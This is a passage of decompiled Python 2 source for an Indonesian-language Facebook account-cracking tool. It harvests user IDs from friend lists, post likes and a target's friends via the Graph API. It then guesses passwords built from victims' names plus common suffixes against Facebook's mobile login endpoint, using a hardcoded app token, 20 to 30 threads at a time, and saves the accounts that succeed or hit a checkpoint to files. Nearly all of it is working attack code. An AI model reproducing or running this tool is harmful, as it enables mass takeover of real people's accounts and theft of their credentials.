                                        print '\x1b[1;92m | ' + user + ' \xe2\x80\xa2 ' + pass7 + ' \xe2\x80\xa2 ' + c['name']
                                        oks.append(user)
                                    elif 'www.facebook.com' in w['error_msg']:
                                        print '\x1b[1;93m | ' + user + ' \xe2\x80\xa2 ' + pass7 + ' \xe2\x80\xa2 ' + c['name']
                                        cekpoint.append(user)
                                    else:
                                        pass8 = 'anjing'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        w = json.load(data)
                                        if 'access_token' in w:
                                            print '\x1b[1;92m | ' + user + ' \xe2\x80\xa2 ' + pass8 + ' \xe2\x80\xa2 ' + c['name']
                                            oks.append(user)
                                        elif 'www.facebook.com' in w['error_msg']:
                                            print '\x1b[1;93m | ' + user + ' \xe2\x80\xa2 ' + pass8 + ' \xe2\x80\xa2 ' + c['name']
                                            cekpoint.append(user)
                                        else:
                                            pass9 = 'Indonesia'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            w = json.load(data)
                                            if 'access_token' in w:
                                                print '\x1b[1;92m | ' + user + ' \xe2\x80\xa2 ' + pass9 + ' \xe2\x80\xa2 ' + c['name']
                                                oks.append(user)
                                            elif 'www.facebook.com' in w['error_msg']:
                                                print '\x1b[1;93m | ' + user + ' \xe2\x80\xa2 ' + pass9 + ' \xe2\x80\xa2 ' + c['name']
                                                cekpoint.append(user)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 45 * '\x1b[1;97m='
    print '\x1b[1;97m[\x1b[1;91m\xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mSelesai Dek.....'
    print '\x1b[1;97m[\x1b[1;91m\xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;91m\xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP file tersimpan : out/indo1.txt'
    print 45 * '\x1b[1;97m='
    raw_input('\x1b[1;97m[\x1b[1;97m Kembali \x1b[1;97m]')
    os.system('python2 2020.py')


def crack_likes():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.system('clear')
        print logo
        print '\x1b[1;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
        tez = raw_input('\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] ID Postingan Group / Teman : ')
        r = requests.get('https://graph.facebook.com/' + tez + '/likes?limit=5000&access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

        jalan('\r\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mSukses Mengambil ID \x1b[1;97m...')
    except KeyError:
        print '\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] \x1b[1;97mID Postingan Salah !'
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        crack_likes()

    print '\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] Total ID : ' + str(len(id))
    print '\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] Stop CTRL+Z'
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] Crack Berjalan Dek ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\n\x1b[1;97m=========================================='

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H:%M:%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\x1b[1;92m | ' + zowe + ' | ' + bos1 + ' | ' + j['name']
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\x1b[1;93m | ' + zowe + ' | ' + bos1 + ' | ' + j['name']
                cek = open('done/grup.txt', 'a')
                cek.write('ID:' + zowe + ' PW:' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'] + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\x1b[1;92m | ' + zowe + ' | ' + bos2 + ' | ' + j['name']
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\x1b[1;93m | ' + zowe + ' | ' + bos2 + ' | ' + j['name']
                    cek = open('done/grup.txt', 'a')
                    cek.write('ID:' + zowe + ' PW:' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\x1b[1;92m | ' + zowe + ' | ' + bos3 + ' | ' + j['name']
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\x1b[1;93m | ' + zowe + ' | ' + bos3 + ' | ' + j['name']
                        cek = open('done/grup.txt', 'a')
                        cek.write('ID:' + zowe + ' PW:' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['first_name'] + '123456'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\x1b[1;92m | ' + zowe + ' | ' + bos4 + ' | ' + j['name']
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\x1b[1;93m | ' + zowe + ' | ' + bos4 + ' | ' + j['name']
                            cek = open('done/grup.txt', 'a')
                            cek.write('ID:' + zowe + ' PW:' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['last_name'] + 'Indonesia'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\x1b[1;92m | ' + zowe + ' | ' + bos5 + ' | ' + j['name']
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\x1b[1;93m | ' + zowe + ' | ' + bos5 + ' | ' + j['name']
                                cek = open('done/grup.txt', 'a')
                                cek.write('ID:' + zowe + ' PW:' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = 'Anjing'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\x1b[1;92m | ' + zowe + ' | ' + bos6 + ' | ' + j['name']
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\x1b[1;93m | ' + zowe + ' | ' + bos6 + ' | ' + j['name']
                                    cek = open('done/grup.txt', 'a')
                                    cek.write('ID:' + zowe + ' PW:' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(20)
    p.map(main, id)
    print 45 * '\x1b[1;97m='
    print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mSelesai ....'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP file tersimpan : done/grup.txt'
    print 45 * '\x1b[1;97m='
    raw_input('\x1b[1;97m[\x1b[1;97m Kembali \x1b[1;97m]')
    os.system('python2 UNIS3X.py')


def dump():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        menu()

    os.system('clear')
    print logo
    print '\x1b[1;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[1;97m [\x1b[1;97m01\x1b[1;97m]\x1b[1;93m\x1b[1;97m Ambil ID dari Daftar Teman '
    print '\x1b[1;97m [\x1b[1;97m02\x1b[1;97m]\x1b[1;93m\x1b[1;97m Ambil ID dari Publik / Teman '
    print '\x1b[1;97m [\x1b[1;91m00\x1b[1;97m]\x1b[1;93m\x1b[1;97m Kembali '
    print '\x1b[1;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    dump_pilih()


def dump_pilih():
    cuih = raw_input('\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m ')
    if cuih == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        dump_pilih()
    elif cuih == '1' or cuih == '01':
        id_teman()
    elif cuih == '2' or cuih == '02':
        idfrom_teman()
    elif cuih == '0' or cuih == '00':
        menu()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Yg Benar !'
        dump_pilih()


def id_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        os.system('clear')
        print logo
        print 45 * '\x1b[1;97m='
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mMengambil semua ID Teman \x1b[1;97m...')
        bz = open('out/id_teman.txt', 'w')
        for a in z['data']:
            idteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;97m[\x1b[1;93m' + str(len(idteman)) + '\x1b[1;97m]\x1b[1;97m =>',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[1;97m' + a['id']

        bz.close()
        print '\r\x1b[1;97m[\x1b[1;93m\xe2\x9c\x93\x1b[1;97m] \x1b[1;97mSukses Mengambil ID \x1b[1;97m....'
        print '\r\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal ID : %s' % len(idteman)
        done = raw_input('\r\x1b[1;97m[\x1b[1;93m?\x1b[1;97m] \x1b[1;97mSimpan Nama File : ')
        os.rename('out/id_teman.txt', 'out/' + done)
        print '\r\x1b[1;97m[\x1b[1;95m+\x1b[1;97m] \x1b[1;97mFile tersimpan : \x1b[1;97mout/' + done
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        raw_input('\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        os.system('python2 2020.py')
    except IOError:
        print '\x1b[1;91m[!] Gagal membuat file'
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;97m[!] Terhenti !'
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Gagal !'
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        dump()
    except OSError:
        print '\x1b[1;97m[\x1b[1;95m!\x1b[1;97m]\x1b[1;97m File anda tidak tersimpan !'
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        os.system('python2 2020.py')
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\xc3\x97] Tidak ada koneksi !'
        keluar()


def idfrom_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        os.system('clear')
        print logo
        print '\x1b[1;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
        idt = raw_input('\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] User ID Target : ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mNama Akun      : ' + op['name']
        except KeyError:
            print '\x1b[1;97m[\x1b[1;91m\xe2\x80\xa2\x1b[1;93m\xe2\x80\xa2\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] ID Publik Tidak Ada !'
            raw_input('\n\x1b[1;97m[\x1b[1;97m Kembali \x1b[1;97m]')
            dump()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[1;97m [\x1b[1;91m\xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mMengambil Semua ID ...')
        print '\x1b[1;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
        bz = open('out/id_teman_from_teman.txt', 'w')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;97m [ \x1b[1;97m' + str(len(idfromteman)) + '\x1b[1;97m ]\x1b[1;91m \xe2\x80\xa2\x1b[1;97m\xe2\x80\xa2\x1b[1;97m',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[1;97m ' + a['id']

        bz.close()
        print '\r\x1b[1;97m[\x1b[1;93m\xe2\x9c\x93\x1b[1;97m] \x1b[1;97mSukses Mengambil ID \x1b[1;97m....'
        print '\r\x1b[1;97m[\x1b[1;93m\xe2\x80\xa2\x1b[1;97m] Total ID : %s' % len(idfromteman)
        done = raw_input('\r\x1b[1;97m[\x1b[1;93m+\x1b[1;97m] \x1b[1;97mSimpan Nama File : ')
        os.rename('out/id_teman_from_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[\x1b[1;95m\xe2\x88\x9a\x1b[1;97m] File tersimpan : out/' + done
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        dump()
    except OSError:
        print '\x1b[1;97m[!] File Tidak Tersimpan '
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        os.system('python2 2020.py')
    except IOError:
        print '\x1b[1;97m[!] Error creating file'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        os.system('python2 2020.py')
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;97m[!] Terhenti'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except KeyError:
        print '\x1b[1;97m[\x1b[1;95m!\x1b[1;97m] Teman tidak ada !'
        raw_input('\n\x1b[1;93m[\x1b[1;97m Kembali \x1b[1;93m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\x1b[1;91m\xe2\x9c\x96\x1b[1;97m] Tidak ada koneksi !'
        keluar()


def saya():
    os.system('clear')
    print logo
    jalan('        \x1b[92mAnda Akan Di Arahkan Ke Browser')
    os.system('xdg-open https://m.facebook.com/cindy.adelia.330')
    menu()


if __name__ == '__main__':
    menu()
    masuk()
# okay decompiling 2020.pyc
